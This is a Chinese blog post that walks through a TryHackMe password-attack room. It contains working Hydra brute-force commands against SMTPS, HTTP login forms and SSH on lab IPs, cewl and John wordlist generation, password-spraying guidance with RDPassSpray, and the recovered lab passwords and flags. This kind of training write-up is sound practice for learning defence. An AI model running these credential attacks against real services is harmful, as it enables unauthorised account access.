<span class="hljs-number">1</span> of <span class="hljs-number">1</span> target successfully completed, <span class="hljs-number">1</span> valid password found 
Hydra (<span class="hljs-attribute">http</span>://www.thc.org/thc-hydra) 
finished at <span class="hljs-number">2021</span>-<span class="hljs-number">10</span>-<span class="hljs-number">13</span> <span class="hljs-number">08</span>:<span class="hljs-number">06</span>:<span class="hljs-number">45</span></code></pre>
<blockquote>
<p>-l admin 我们指定单个用户名，使用-L 作为用户名单词列表</p>
<p>-P Path 指定wordlist的完整路径，可以使用-p指定单个密码.</p>
<p>10.10.x.x 目标的 IP 地址或完全限定域名 (FQDN)。</p>
<p>http-get-form HTTP 请求的类型，可以是 http-get-form 或 http-post-form.</p>
</blockquote>
<p>接下来，我们使用以下命令指定分割的 URL、路径和条件：</p>
<blockquote>
<p>/login-get/index.php 目标网络服务器上登录页面的路径。</p>
<p>username=^USER^&amp;password=^PASS^ 暴力破解的参数，我们注入 ^USER^ 来暴力破解用户名，注入 ^PASS^ 来破解指定字典中的密码。</p>
</blockquote>
<p>以下部分对于通过使用<code>F=Invalid Password</code>条件来消除误报非常重要.</p>
<p>同时还有成功条件，S=。通过分析网页或在枚举阶段您将获得有关这些情况的更多信息！您为这些值设置的内容取决于您从服务器收到的针对失败登录尝试和成功登录尝试的响应。例如，如果您登录失败后在网页上收到“密码无效”的消息，请设置 F=无效密码.</p>
<p>或者例如，在枚举过程中，我们发现Web服务器提供logout.php。使用有效凭据登录登录页面后，我们可以猜测页面上的某处将有 logout.php。因此，我们可以告诉 Hydra 在每个请求的 HTML 中查找文本 logout.php。</p>
<blockquote>
<p>S=logout.php 识别有效凭证的成功条件</p>
<p>-f 在找到有效的用户名和密码后停止暴力攻击</p>
</blockquote>
<p>您可以通过访问 <a target="_blank" rel="noopener" href="http://10.10.183.122/login-get/index.php">http://10.10.183.122/login-get/index.php</a> 在连接的虚拟机上进行尝试。如果您尚未回答以下问题，请务必部署附加的虚拟机。</p>
<p>最后，值得检查其他在线密码攻击工具来扩展您的知识，例如：</p>
<ul>
<li>Medusa</li>
<li>Ncrack</li>
<li>others!</li>
</ul>
<h3 id="实践练习">实践练习</h3>
<p>您能在不进行暴力破解的情况下猜出 FTP 凭据吗？旗帜是什么？</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407152217819.png" alt="image-20240715193500648"></p>
<p>ftp匿名登录即可</p>
<pre><code class="hljs scss">┌──(hybcx㉿LAPTOP-<span class="hljs-number">1</span>TO1HS75)-<span class="hljs-selector-attr">[~]</span>
└─$ ls                                                                                                 
armitage-tmp  Desktop    Downloads  Music         Pictures  Public     Tools
C2            Documents  flag<span class="hljs-selector-class">.txt</span>   nacos-docker  Proxy     Templates  Videos

┌──(hybcx㉿LAPTOP-<span class="hljs-number">1</span>TO1HS75)-<span class="hljs-selector-attr">[~]</span>
└─$ cat flag<span class="hljs-selector-class">.txt</span> 
THM{d0abe799f25738ad739c20301aed357b}</code></pre>
<p>在本题中，您需要从上一个任务中的单词列表 Clinic.lst 生成基于规则的字典。电子邮件：</p>
<pre><code class="hljs scss">pittman<span class="hljs-keyword">@clinic</span>.thmredteam.com <span class="hljs-number">10.10</span>.<span class="hljs-number">183.122</span>:<span class="hljs-number">465</span> (SMTPS)</code></pre>
<p>密码是什么？注意密码格式如下：<code>[symbol][dictionary word][0-9][0-9]</code></p>
<p>首先利用cewl深度爬取目标网站泄露的信息（用于构建密码字典）</p>
<pre><code class="hljs scss">cewl -m <span class="hljs-number">8</span> -w clinic<span class="hljs-selector-class">.lst</span> https://clinic.thmredteam.com/</code></pre>
<p>得到初步单词列表，随后根据提示，构建自己的john规则，生成对用的密码单词列表</p>
<pre><code class="hljs scss">john <span class="hljs-attr">--wordlist</span>=clinic<span class="hljs-selector-class">.lst</span> <span class="hljs-attr">--rules</span>=THM-Password-Attacks <span class="hljs-attr">--stdout</span> &gt; passwds<span class="hljs-selector-class">.txt</span></code></pre>
<p>之后根据这个字典，用hydra枚举smtps邮件网站的登陆凭据</p>
<pre><code class="hljs scss">┌──(hybcx㉿LAPTOP-<span class="hljs-number">1</span>TO1HS75)-<span class="hljs-selector-attr">[~]</span>
└─$ hydra -l pittman<span class="hljs-keyword">@clinic</span>.thmredteam.com -P passwds.txt <span class="hljs-attribute">smtps</span>://<span class="hljs-number">10.10</span>.<span class="hljs-number">183.122</span> -v
Hydra v9.<span class="hljs-number">5</span> (c) <span class="hljs-number">2023</span> by van Hauser/THC &amp; David Maciejak - Please do <span class="hljs-keyword">not</span> use in military <span class="hljs-keyword">or</span> secret service organizations, <span class="hljs-keyword">or</span> for illegal purposes (this is non-binding, these *** ignore laws <span class="hljs-keyword">and</span> ethics anyway).

Hydra (<span class="hljs-attribute">https</span>://github.com/vanhauser-thc/thc-hydra) starting at <span class="hljs-number">2024</span>-<span class="hljs-number">07</span>-<span class="hljs-number">15</span> <span class="hljs-number">20</span>:<span class="hljs-number">01</span>:<span class="hljs-number">27</span>
[INFO] several providers have implemented cracking protection, check with a small wordlist first - <span class="hljs-keyword">and</span> stay legal!
[DATA] max <span class="hljs-number">16</span> tasks per <span class="hljs-number">1</span> server, overall <span class="hljs-number">16</span> tasks, <span class="hljs-number">42000</span> login tries (<span class="hljs-attribute">l</span>:<span class="hljs-number">1</span>/<span class="hljs-attribute">p</span>:<span class="hljs-number">42000</span>), ~<span class="hljs-number">2625</span> tries per task
[DATA] attacking <span class="hljs-attribute">smtps</span>://<span class="hljs-number">10.10</span>.<span class="hljs-number">183.122</span>:<span class="hljs-number">465</span>/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[<span class="hljs-number">465</span>][smtp] <span class="hljs-attribute">host</span>: <span class="hljs-number">10.10</span>.<span class="hljs-number">183.122</span>   <span class="hljs-attribute">login</span>: pittman<span class="hljs-keyword">@clinic</span>.thmredteam.com   <span class="hljs-attribute">password</span>: !multidisciplinary00
[STATUS] attack finished for <span class="hljs-number">10.10</span>.<span class="hljs-number">183.122</span> (waiting for children to complete tests)
<span class="hljs-number">1</span> of <span class="hljs-number">1</span> target successfully completed, <span class="hljs-number">1</span> valid password found
Hydra (<span class="hljs-attribute">https</span>://github.com/vanhauser-thc/thc-hydra) finished at <span class="hljs-number">2024</span>-<span class="hljs-number">07</span>-<span class="hljs-number">15</span> <span class="hljs-number">20</span>:<span class="hljs-number">01</span>:<span class="hljs-number">38</span></code></pre>
<p>使用 Hydra 对登录页面 <a target="_blank" rel="noopener" href="http://10.10.183.122/login-get">http://10.10.183.122/login-get</a> 的 phillips 帐户执行暴力攻击？旗帜是什么？</p>
<pre><code class="hljs scss">hydra -l phillips -<span class="hljs-selector-tag">P</span> passwds<span class="hljs-selector-class">.txt</span> <span class="hljs-number">10.10</span><span class="hljs-selector-class">.183</span><span class="hljs-selector-class">.122</span> http-get-<span class="hljs-selector-tag">form</span> "/login-get/index<span class="hljs-selector-class">.php</span>:username=^USER^&amp;password=^PASS^:S=logout.php<span class="hljs-string">"</span></code></pre>
<pre><code class="hljs scss">┌──(hybcx㉿LAPTOP-<span class="hljs-number">1</span>TO1HS75)-<span class="hljs-selector-attr">[~]</span>
└─$ hydra -l phillips -<span class="hljs-selector-tag">P</span> clinic<span class="hljs-selector-class">.lst</span> <span class="hljs-number">10.10</span><span class="hljs-selector-class">.183</span><span class="hljs-selector-class">.122</span> http-get-<span class="hljs-selector-tag">form</span> "/login-get/index<span class="hljs-selector-class">.php</span>:username=^USER^&amp;password=^PASS^:S=logout.php<span class="hljs-string">"</span>
<span class="hljs-string">Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span>
<span class="hljs-string"></span>
<span class="hljs-string">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-07-15 20:30:27</span>
<span class="hljs-string">[DATA] max 16 tasks per 1 server, overall 16 tasks, 105 login tries (l:1/p:105), ~7 tries per task</span>
<span class="hljs-string">[DATA] attacking http-get-form://10.10.183.122:80/login-get/index.php:username=^USER^&amp;password=^PASS^:S=logout.php</span>
<span class="hljs-string">[80][http-get-form] host: 10.10.183.122   login: phillips   password: Paracetamol</span>
<span class="hljs-string">1 of 1 target successfully completed, 1 valid password found</span>
<span class="hljs-string">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-07-15 20:30:30</span></code></pre>
<p>就是不知为何，非要利用S选项才可以，如果时F选项，会展示多个无效密码</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407152217820.png" alt="image-20240715203151681"></p>
<p>执行基于规则的密码攻击以获取 burgess 帐户的访问权限。在以下网站找到该标志：<a target="_blank" rel="noopener" href="http://10.10.183.122/login-post/%E3%80%82%E6%97%97%E5%B8%9C%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F">http://10.10.183.122/login-post/。旗帜是什么？</a></p>
<p>注意：使用 Clinic.lst 字典来生成和扩展单词列表！</p>
<pre><code class="hljs scss">hydra -l burgess -<span class="hljs-selector-tag">P</span> dict<span class="hljs-selector-class">.txt</span> <span class="hljs-number">10.10</span><span class="hljs-selector-class">.183</span><span class="hljs-selector-class">.122</span> http-post-<span class="hljs-selector-tag">form</span> "/login-post/index<span class="hljs-selector-class">.php</span>:username=^USER^&amp;password=^PASS^:S=logout.php<span class="hljs-string">"</span></code></pre>
<pre><code class="hljs scss">┌──(hybcx㉿LAPTOP-<span class="hljs-number">1</span>TO1HS75)-<span class="hljs-selector-attr">[~]</span>
└─$ hydra -l burgess -<span class="hljs-selector-tag">P</span> dict<span class="hljs-selector-class">.txt</span> <span class="hljs-number">10.10</span><span class="hljs-selector-class">.183</span><span class="hljs-selector-class">.122</span> http-post-<span class="hljs-selector-tag">form</span> "/login-post/index<span class="hljs-selector-class">.php</span>:username=^USER^&amp;password=^PASS^:S=logout.php<span class="hljs-string">"</span>
<span class="hljs-string">Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span>
<span class="hljs-string"></span>
<span class="hljs-string">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-07-15 20:34:28</span>
<span class="hljs-string">[DATA] max 16 tasks per 1 server, overall 16 tasks, 537026 login tries (l:1/p:537026), ~33565 tries per task</span>
<span class="hljs-string">[DATA] attacking http-post-form://10.10.183.122:80/login-post/index.php:username=^USER^&amp;password=^PASS^:S=logout.php</span>
<span class="hljs-string">[STATUS] 724.00 tries/min, 724 tries in 00:01h, 536302 to do in 12:21h, 16 active</span>
<span class="hljs-string">[80][http-post-form] host: 10.10.183.122   login: burgess   password: OxytocinnicotyxO</span>
<span class="hljs-string">1 of 1 target successfully completed, 1 valid password found</span>
<span class="hljs-string">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-07-15 20:37:23</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407152217821.png" alt="image-20240715203827451"></p>
<h2 id="密码喷洒攻击">密码喷洒攻击</h2>
<p>此任务将教授密码喷射攻击的基础知识以及针对常见在线服务执行各种攻击场景所需的工具。</p>
<p>密码喷射是一种用于识别有效凭据的有效技术。如今，密码喷射被认为是发现弱密码的常见密码攻击之一。该技术可用于攻击各种在线服务和身份验证系统，例如 SSH、SMB、RDP、SMTP、Outlook Web 应用程序等。暴力攻击针对特定用户名来尝试许多弱且可预测的密码。虽然密码喷射攻击使用一个常见的弱密码来针对许多用户名，但这可能有助于避免帐户锁定策略。下图解释了密码喷射攻击的概念，其中攻击者对多个用户使用一个通用密码。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407152217822.png" alt="image-20240715204425518"></p>
<p>普通密码和弱密码通常遵循一定的模式和格式。下面可以找到一些常用的密码及其总体格式。</p>
<ul>
<li>当前季节紧接着当前年份 (SeasonYear)。For example, <strong>Fall2020</strong>, <strong>Spring2021</strong>, etc.</li>
<li>当前月份后跟当前年份 (MonthYear)。For example, <strong>November2020</strong>, <strong>March2021</strong>, etc.</li>
<li>使用公司名称和随机数字 (CompanyNameNumbers)。For example, TryHackMe01, TryHackMe02.</li>
</ul>
<p>如果组织内部强制执行密码复杂性策略，我们可能需要创建一个包含满足要求的符号的密码，例如 October2021!、Spring2021!、October2021@ 等。要成功进行密码喷射攻击，我们需要枚举目标并创建有效用户名列表（或电子邮件地址列表）.</p>
<p>接下来，我们将针对不同的服务应用不同场景的密码喷射技术，包括：</p>
<ul>
<li>SSH</li>
<li>RDP</li>
<li>Outlook web access (OWA) portal</li>
<li>SMB</li>
</ul>
<h3 id="ssh">SSH</h3>
<p>假设我们已经枚举了系统并创建了有效的用户名列表。</p>
<pre><code class="hljs scss">user<span class="hljs-keyword">@THM</span>:~# cat usernames-list.txt
admin
victim
dummy
adm
sammy</code></pre>
<p>这里我们可以使用 Hydra 用 Spring2021 密码对 SSH 服务进行密码喷射攻击。</p>
<pre><code class="hljs scss">user<span class="hljs-keyword">@THM</span>:~$ hydra -L usernames-list.txt -p Spring2021 <span class="hljs-attribute">ssh</span>://<span class="hljs-number">10.1</span>.<span class="hljs-number">1.10</span>
[INFO] Successful, password authentication is supported by <span class="hljs-attribute">ssh</span>://<span class="hljs-number">10.1</span>.<span class="hljs-number">1.10</span>:<span class="hljs-number">22</span>
[<span class="hljs-number">22</span>][ssh] <span class="hljs-attribute">host</span>: <span class="hljs-number">10.1</span>.<span class="hljs-number">1.10</span> <span class="hljs-attribute">login</span>: victim <span class="hljs-attribute">password</span>: Spring2021
[STATUS] attack finished for <span class="hljs-number">10.1</span>.<span class="hljs-number">1.10</span> (waiting for children to complete tests)
<span class="hljs-number">1</span> of <span class="hljs-number">1</span> target successfully completed, <span class="hljs-number">1</span> valid password found</code></pre>
<p>请注意，L 是加载有效用户名列表，-p 对 10.1.1.10 的 SSH 服务使用 Spring2021 密码。上面的输出表明我们已成功找到凭据。</p>
<h3 id="rdp">RDP</h3>
<p>假设我们在端口 3026 上发现了暴露的 RDP 服务。我们可以使用 <a target="_blank" rel="noopener" href="https://github.com/xFreed0m/RDPassSpray">RDPassSpray</a> 等工具对 RDP 进行密码喷射。首先，按照该工具的 GitHub 存储库中的安装说明在攻击计算机上安装该工具。作为该工具的新用户，我们将首先执行 python3 <a target="_blank" rel="noopener" href="http://RDPassSpray.py">RDPassSpray.py</a> -h 命令来查看如何使用该工具</p>
<pre><code class="hljs scss">user<span class="hljs-keyword">@THM</span>:~# python3 RDPassSpray.py -h
<span class="hljs-attribute">usage</span>: RDPassSpray.py [-h] (-U USERLIST | -u USER  -p PASSWORD | -P PASSWORDLIST) (-T TARGETLIST | -t TARGET) [-s SLEEP | -r minimum_sleep maximum_sleep] [-d DOMAIN] [-n NAMES] [-o OUTPUT] [-V]

optional <span class="hljs-attribute">arguments</span>:
  -h, --help            show this help message <span class="hljs-keyword">and</span> exit
  -U USERLIST, --userlist USERLIST
                        Users list to use, one user per line
  -u USER, --user USER  Single user to use
  -p PASSWORD, --password PASSWORD
                        Single password to use
  -P PASSWORDLIST, --passwordlist PASSWORDLIST
                        Password list to use, one password per line
  -T TARGETLIST, --targetlist TARGETLIST
                        Targets list to use, one target per line
  -t TARGET, --target TARGET
                        Target machine to authenticate against
  -s SLEEP, --sleep SLEEP
                        Throttle the attempts to one attempt every # seconds, can be randomized by passing the value <span class="hljs-string">'random'</span> - default is <span class="hljs-number">0</span>
  -r minimum_sleep maximum_sleep, --random minimum_sleep maximum_sleep
                        Randomize the time between each authentication attempt. Please provide minimun <span class="hljs-keyword">and</span> maximum values in seconds
  -d DOMAIN, --domain DOMAIN
                        Domain name to use
  -n NAMES, --names NAMES
                        Hostnames list to use as the source hostnames, one per line
  -o OUTPUT, --output OUTPUT
                        Output each attempt result to a csv file
  -V, --verbose         Turn on verbosity to show failed attempts</code></pre>
<p>现在，让我们尝试使用 (-u) 选项将victim指定为用户名，并使用 (-p) 选项设置 Spring2021!。 (-t)选项是选择单个主机进行攻击.</p>
<p>上面的输出显示我们成功找到了有效的凭据受害者：Spring2021！请注意，如果我们处于 Active Directory 环境中，我们可以使用 -d 选项指定域名.</p>
<pre><code class="hljs scss">user<span class="hljs-keyword">@THM</span>:~# python3 RDPassSpray.py -U usernames-list.txt -p Spring2021! -d THM-labs -T RDP_servers.txt</code></pre>
<p>有各种工具可以针对不同的服务执行喷洒密码攻击，例如：</p>
<h3 id="outlook-web-access-owa-portal">Outlook Web Access (OWA) portal</h3>
<p>Tools:</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/byt3bl33d3r/SprayingToolkit">SprayingToolkit</a> (<a target="_blank" rel="noopener" href="http://atomizer.py">atomizer.py</a>)</li>
<li><a target="_blank" rel="noopener" href="https://github.com/dafthack/MailSniper">MailSniper</a></li>
</ul>
<h3 id="smb">SMB</h3>
<ul>
<li>Tool: Metasploit (auxiliary/scanner/smb/smb_login)</li>
</ul>
<h3 id="实践练习">实践练习</h3>
<p>使用以下用户名列表：</p>
<pre><code class="hljs scss">user<span class="hljs-keyword">@THM</span>:~# cat usernames-list.txt 
admin
phillips
burgess
pittman
guess</code></pre>
<p>执行密码喷射攻击以访问 SSH://10.10.183.122 服务器以读取 /etc/flag。旗帜是什么？</p>
<p>根据给的提示：</p>
<pre><code class="hljs scss">季节+年份+特殊字符。对于季节，请考虑使用“Full”而不是“Autumn”。对于年份，请尝试 (<span class="hljs-number">2020</span>-<span class="hljs-number">2021</span>) 之间的年份</code></pre>
<p>那只能先自定义规则，通过john来生成密码列表了</p>
<p>先构造含有Fall的文件，然后自定义规则</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407152217823.png" alt="image-20240715210446884"></p>
<p>之后生成目标单词列表</p>
<pre><code class="hljs scss">┌──(hybcx㉿LAPTOP-<span class="hljs-number">1</span>TO1HS75)-<span class="hljs-selector-attr">[~]</span>
└─$ john <span class="hljs-attr">--wordlist</span>=passwd<span class="hljs-selector-class">.txt</span> <span class="hljs-attr">--rule</span>=THM-PassSpray <span class="hljs-attr">--stdout</span> &gt; pass<span class="hljs-selector-class">.txt</span>                             
Using default <span class="hljs-selector-tag">input</span> encoding: UTF-<span class="hljs-number">8</span>
Press <span class="hljs-string">'q'</span> or Ctrl-C to abort, almost any other key for status
<span class="hljs-number">32</span>p <span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> <span class="hljs-number">100.00%</span> (<span class="hljs-number">2024</span>-<span class="hljs-number">07</span>-<span class="hljs-number">15</span> <span class="hljs-number">21</span>:<span class="hljs-number">03</span>) <span class="hljs-number">1600</span>p/s Fall2021$</code></pre>
<p>接着爆破即可</p>
<pre><code class="hljs scss">┌──(hybcx㉿LAPTOP-<span class="hljs-number">1</span>TO1HS75)-<span class="hljs-selector-attr">[~]</span>
└─$ hydra -L usernames<span class="hljs-selector-class">.txt</span> -<span class="hljs-selector-tag">P</span> pass<span class="hljs-selector-class">.txt</span> ssh://<span class="hljs-number">10.10</span>.<span class="hljs-number">183.122</span> 
Hydra v9.<span class="hljs-number">5</span> (c) <span class="hljs-number">2023</span> by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at <span class="hljs-number">2024</span>-<span class="hljs-number">07</span>-<span class="hljs-number">15</span> <span class="hljs-number">21</span>:<span class="hljs-number">03</span>:<span class="hljs-number">53</span>
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t <span class="hljs-number">4</span>
[DATA] max <span class="hljs-number">16</span> tasks per <span class="hljs-number">1</span> server, overall <span class="hljs-number">16</span> tasks, <span class="hljs-number">160</span> login tries (l:<span class="hljs-number">5</span>/p:<span class="hljs-number">32</span>), ~<span class="hljs-number">10</span> tries per task
[DATA] attacking ssh://<span class="hljs-number">10.10</span>.<span class="hljs-number">183.122</span>:<span class="hljs-number">22</span>/
[<span class="hljs-number">22</span>][ssh] host: <span class="hljs-number">10.10</span>.<span class="hljs-number">183.122</span>   login: burgess   password: Fall2021@
<span class="hljs-number">1</span> of <span class="hljs-number">1</span> target successfully completed, <span class="hljs-number">1</span> valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at <span class="hljs-number">2024</span>-<span class="hljs-number">07</span>-<span class="hljs-number">15</span> <span class="hljs-number">21</span>:<span class="hljs-number">04</span>:<span class="hljs-number">38</span></code></pre>
<pre><code class="hljs scss">┌──(hybcx㉿LAPTOP-<span class="hljs-number">1</span>TO1HS75)-<span class="hljs-selector-attr">[~]</span>
└─$ ssh burgess@<span class="hljs-number">10.10</span>.<span class="hljs-number">183.122</span>                                                                          
The authenticity of host <span class="hljs-string">'10.10.183.122 (10.10.183.122)'</span> can<span class="hljs-string">'t be established.</span>
<span class="hljs-string">ED25519 key fingerprint is SHA256:cCRW5ZAuU9J19QjyoeN8D6GW5SqrButZKEqD2t3+Kx4.</span>
<span class="hljs-string">This key is not known by any other names.</span>
<span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span>
<span class="hljs-string">Warning: Permanently added '</span><span class="hljs-number">10.10</span>.<span class="hljs-number">183.122</span><span class="hljs-string">' (ED25519) to the list of known hosts.</span>
<span class="hljs-string">burgess@10.10.183.122'</span>s <span class="hljs-attribute">password</span>: 
Welcome to Ubuntu <span class="hljs-number">18.04</span>.<span class="hljs-number">5</span> LTS (GNU/Linux <span class="hljs-number">5.4</span>.<span class="hljs-number">0</span>-<span class="hljs-number">1058</span>-aws x86_64)</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407152217824.png" alt="image-20240715210623740"></p>
<h1 id="0x08-总结">0x08 总结</h1>
<p>该会议室介绍了不同密码攻击的基本概念以及如何创建自定义和有针对性的密码列表。我们涵盖并讨论了各种主题，包括:</p>
<ul>
<li>默认、弱、泄漏的组合词表</li>
<li>密码分析</li>
<li>Offline password attacks 离线密码攻击</li>
<li>Online password attacks 在线密码攻击</li>
</ul>
</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">hybcx</div><div class="post-copyright__author_desc">只需热爱, 未来可期！</div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://hybcx.xyz/2024/07/14/thm-password-gong-ji/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://hybcx.xyz/2024/07/14/thm-password-gong-ji/')">THM-password攻击</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="http://hybcx.xyz/2024/07/14/thm-password-gong-ji/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=THM-password攻击&amp;url=http://hybcx.xyz/2024/07/14/thm-password-gong-ji/&amp;pic=" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
  var currentPageUrl = window.location.href;
  var input = document.createElement("input");
  input.setAttribute("value", currentPageUrl);
  document.body.appendChild(input);
  input.select();
  input.setSelectionRange(0, 99999);
  document.execCommand("copy");
  document.body.removeChild(input);
}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://hybcx.xyz" target="_blank">hybcx</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/TryHackMe/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>TryHackMe<span class="tagsPageCount">36</span></a></div></div></div><div class="post_share"><div class="social-share" data-image="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/07/14/ctf-shua-ti/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">CTF刷题</div></div></a></div><div class="next-post pull-right"><a href="/2024/07/16/thm-dang-qian-tai-shi/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">THM-当前态势</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size: 1.5rem; margin-right: 4px"></i><span>喜欢这篇文章的人也看了</span></div><div class="relatedPosts-list"><div><a href="/2024/02/14/thm-basic-pentesting/" title="THM-Basic Pentesting"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-02-14</div><div class="title">THM-Basic Pentesting</div></div></a></div><div><a href="/2024/07/10/thm-c2-jian-jie/" title="THM-C2简介"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 